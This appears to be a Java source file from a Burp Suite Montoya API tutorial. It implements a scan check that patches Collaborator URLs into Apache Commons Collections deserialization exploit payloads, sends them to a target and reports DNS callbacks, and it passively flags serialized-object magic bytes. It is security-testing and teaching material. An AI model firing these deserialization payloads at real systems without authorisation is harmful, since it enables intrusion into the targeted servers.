package org.fd.montoyatutorial;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.collaborator.InteractionFilter;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.core.Marker;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.scanner.AuditResult;
import burp.api.montoya.scanner.ConsolidationAction;
import burp.api.montoya.scanner.ScanCheck;
import burp.api.montoya.scanner.audit.insertionpoint.AuditInsertionPoint;
import burp.api.montoya.scanner.audit.issues.AuditIssue;
import burp.api.montoya.utilities.Utilities;
import burp.api.montoya.collaborator.CollaboratorClient;

import java.util.ArrayList;
import java.util.List;

public class CustomCollaboratorScanCheck implements ScanCheck {

    // Magic bytes of a serialized Java object (not encoded and Base64 encoded)
    private byte[] serializationMagicBytes = {(byte)0xac, (byte)0xed, (byte)0x00, (byte)0x05};
    private byte[] base64MagicBytes = {(byte)0x72, (byte)0x4f, (byte)0x30, (byte)0x41};

    MontoyaApi api;
    Utilities utilities;
    CollaboratorClient collaboratorClient;

    public CustomCollaboratorScanCheck(MontoyaApi api) {

        // Save references to usefull objects
        this.api = api;
        this.utilities = this.api.utilities();

        // Create a new instance of the Collaborator client
        this.collaboratorClient = this.api.collaborator().createClient();

    }

    // This method create serialized objects with specific Collaborator URLs. Serialized object are binary
    // and we cannot simply replace a placeholder in the payload but it is necessary to fix a couple
    // of lengths in the binary objects, that depend on the legnth of the Collaborator URL.
    public ByteArray createDnsPayload(ByteArray genericPayload, String collaboratorURL) {

        String hostTokenString = "XXXXX";

        int indexPlaceholderFirstUrlCharacter = genericPayload.indexOf(hostTokenString, true);
        int indexPlaceholderLastUrlCharacter = indexPlaceholderFirstUrlCharacter + hostTokenString.length() -1;

        int newCollaboratorVectorLength = collaboratorURL.length();

        ByteArray payloadPortionBeforeUrl = genericPayload.subArray(0, indexPlaceholderFirstUrlCharacter);
        ByteArray payloadPortionAfterUrl = genericPayload.subArray(indexPlaceholderLastUrlCharacter+1, genericPayload.length());

        payloadPortionBeforeUrl.setByte(payloadPortionBeforeUrl.length()-1, (byte)newCollaboratorVectorLength);

        ByteArray payloadWithCollaboratorUrl = payloadPortionBeforeUrl.withAppended(ByteArray.byteArray(collaboratorURL));
        payloadWithCollaboratorUrl = payloadWithCollaboratorUrl.withAppended(payloadPortionAfterUrl);

        // Adjust one more length in the serialization process when the TemplateImpl object is used for exploitation
        ByteArray patternTemplateImplToSearch = ByteArray.byteArray(new byte[]{(byte)0xf8,(byte)0x06,(byte)0x08,(byte)0x54,(byte)0xe0,(byte)0x02,(byte)0x00,(byte)0x00,(byte)0x78,(byte)0x70,(byte)0x00,(byte)0x00,(byte)0x06});
        int indexOfPatternTemplateImpl = payloadWithCollaboratorUrl.indexOf(patternTemplateImplToSearch,false);
        if(indexOfPatternTemplateImpl != -1)
            payloadWithCollaboratorUrl.setByte(indexOfPatternTemplateImpl+13, (byte)(payloadWithCollaboratorUrl.getByte(indexOfPatternTemplateImpl+13) + (newCollaboratorVectorLength - 5)));

        return payloadWithCollaboratorUrl;

    }

    @Override
    public AuditResult activeAudit(HttpRequestResponse baseRequestResponse, AuditInsertionPoint auditInsertionPoint) {

        // Inizialize an empty list of audit issues that we will eventually populate and return at the end of the function
        List<AuditIssue> activeAuditIssues = new ArrayList<AuditIssue>();

        // For each CommonsCollections 3 payload we defined, we try to exploit the issue
        for(int i = 0; i< StaticItems.apacheCommonsCollections3Payloads.length; i++) {

            // We generate a Collaborator URL
            String collaboratorUrl = collaboratorClient.generatePayload().toString();

            // We update our serialized object inserting the generated Collaborator URL
            ByteArray payloadWithCollaboratorUrl = utilities.base64Utils().encode(
                    createDnsPayload(
                            utilities.base64Utils().decode(StaticItems.apacheCommonsCollections3Payloads[i]),
                            collaboratorUrl));

            // We create an HTTP request containing our payload in the current insertion point
            HttpRequest commonsCollectionsCheckRequest = auditInsertionPoint.buildHttpRequestWithPayload(
                    payloadWithCollaboratorUrl).withService(baseRequestResponse.httpService());

            // We send the request containing the payload
            HttpRequestResponse commonsCollectionsCheckRequestResponse = api.http().sendRequest(commonsCollectionsCheckRequest);

            // We retrieve the interactions received by the Collaborator related to our specific Collaborator URL
            List<Interaction> interactionList = collaboratorClient.getInteractions(InteractionFilter.interactionPayloadFilter(collaboratorUrl));

            if(interactionList.size() > 0) {

                // If we have interactions, we create an issue object and adds it to the list of issues to be returned
                AuditIssue auditIssue = AuditIssue.auditIssue(StaticItems.apacheCommonsCollections3IssueName,
                        StaticItems.apacheCommonsCollections3IssueDetail,
                        null, // remediation
                        baseRequestResponse.request().url(),
                        StaticItems.apacheCommonsCollections3IssueSeverity,
                        StaticItems.apacheCommonsCollections3IssueConfidence,
                        null, // background
                        null, // remediationBackground
                        StaticItems.apacheCommonsCollections3IssueTypicalSeverity,
                        commonsCollectionsCheckRequestResponse); //Request/response can be highlighted

                activeAuditIssues.add(auditIssue);

            }

        }

        // Return the list of issues
        return AuditResult.auditResult(activeAuditIssues);

    }

    @Override
    public AuditResult passiveAudit(HttpRequestResponse baseRequestResponse) {

        // Inizialize an empty list of audit issues that we will eventually populate and return at the end of the function
        List<AuditIssue> passiveAuditIssues = new ArrayList<AuditIssue>();

        //Extract request bytes
        ByteArray request = baseRequestResponse.request().toByteArray();

        // Check for the magic bytes of Java serialized object (not encoded and Base64 encoded)
        int indexOfSerializationMagicBytes = request.indexOf(ByteArray.byteArray(serializationMagicBytes));
        int indexOfBase64MagicBytes = request.indexOf(ByteArray.byteArray(base64MagicBytes));

        // Improvement -> Search all matches with a while instead of an if

        // If we found the magic bytes we report the passive issue
        if(indexOfSerializationMagicBytes != -1 || indexOfBase64MagicBytes != -1) {

            // Calculate the indexes to highligh the start of the serialized object in the request
            int startIndex;
            if(indexOfSerializationMagicBytes != -1)
                startIndex = indexOfSerializationMagicBytes;
            else
                startIndex = indexOfBase64MagicBytes;
            int endIndex = startIndex+4;

            // Create the markers to highlight the request in the reported issue
            List<Marker> highlights = new ArrayList<Marker>();
            Marker marker = Marker.marker(startIndex, endIndex);
            highlights.add(marker);

            // Report the passive issue
            AuditIssue auditIssue = AuditIssue.auditIssue(StaticItems.passiveSerializationIssueName,
                    StaticItems.passiveSerializationIssueDetail,
                    null, // remediation
                    baseRequestResponse.request().url(),
                    StaticItems.passiveSerializationIssueSeverity,
                    StaticItems.passiveSerializationIssueConfidence,
                    null, // background
                    null, // remediationBackground
                    StaticItems.passiveSerializationIssueTypicalSeverity,
                    baseRequestResponse.withRequestMarkers(highlights));

            passiveAuditIssues.add(auditIssue);

        }

        // Return the list of issues
        return AuditResult.auditResult(passiveAuditIssues);

    }

    @Override
    public ConsolidationAction consolidateIssues(AuditIssue newIssue, AuditIssue existingIssue) {

        // Improvement: extract HttpRequestResponses and keep existing only if the
        // attack vector has been inserted in the same parameter, but adds complexity

        // If the new issue has the same name and base URL of the one of the older ones, keep only the new one
        if(newIssue.name().equals(existingIssue.name()) && newIssue.baseUrl().equals(existingIssue.baseUrl())) {
            return ConsolidationAction.KEEP_EXISTING;
        } else {
            // Otherwise keep both the issues
            return ConsolidationAction.KEEP_BOTH;
        }

    }

}
